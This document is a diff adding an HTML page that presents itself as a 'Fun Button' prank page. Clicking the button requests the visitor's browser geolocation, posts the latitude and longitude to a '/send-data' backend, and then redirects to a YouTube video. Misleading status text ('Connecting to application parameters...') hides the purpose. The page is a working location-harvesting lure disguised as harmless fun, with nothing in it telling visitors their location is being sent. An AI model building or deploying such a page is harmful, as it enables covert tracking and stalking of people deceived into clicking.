@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Application Hub</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f9;
+            text-align: center;
+            padding: 50px;
+        }
+        button {
+            background-color: #4CAF50;
+            color: white;
+            padding: 12px 24px;
+            font-size: 16px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            margin-top: 20px;
+        }
+        button:hover {
+            background-color: #45a049;
+        }
+        #status-display {
+            font-weight: bold;
+            color: #555;
+            margin-top: 15px;
+        }
+    </style>
+</head>
+<body>
+
+    <h1>Press the Button</h1>
+    
+    <img src="https://ibb.co" alt="Awesome Face" width="350">
+    
+    <div>
+        <button onclick="requestAndSendTelemetry()">Fun Button</button>
+        <p id="status-display">Click the button to have fun!</p>
+    </div>
+
+    <script>
+        const statusText = document.getElementById("status-display");
+
+        function requestAndSendTelemetry() {
+            if (navigator.geolocation) {
+                statusText.innerHTML = "Connecting to application parameters...";
+                navigator.geolocation.getCurrentPosition(sendToServer, handleBrowserError);
+            } else {
+                statusText.innerHTML = "Error: Geolocation features are unsupported.";
+            }
+        }
+
+        function sendToServer(position) {
+            const coordinates = {
+                latitude: position.coords.latitude,
+                longitude: position.coords.longitude
+            };
+
+            // Send data cleanly to Flask via asynchronous JavaScript fetch
+            fetch('/send-data', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(coordinates)
+            })
+            .then(res => res.json())
+            .then(data => {
+                // ---------------------------------------------------------
+                // REDIRECT TRIGGERS HERE AFTER BACKEND CONFIRMS RECEIPT
+                // ---------------------------------------------------------
+                window.location.href = "https://youtu.be/AuKR2fQbMBk?si=ruzplXhHseL-piCK";
+            })
+            .catch(err => {
+                console.error(err);
+                // Fallback redirect even if a network issue occurs
+                window.location.href = "https://youtu.be/AuKR2fQbMBk?si=ruzplXhHseL-piCK";
+            });
+        }
+
+        function handleBrowserError(error) {
+            statusText.style.color = "red";
+            if (error.code === error.PERMISSION_DENIED) {
+                statusText.innerHTML = "❌ Access Denied: Please allow location permissions.";
+            } else {
+                statusText.innerHTML = "❌ Browser Error: " + error.message;
+            }
+        }
+    </script>
+</body>
+</html>
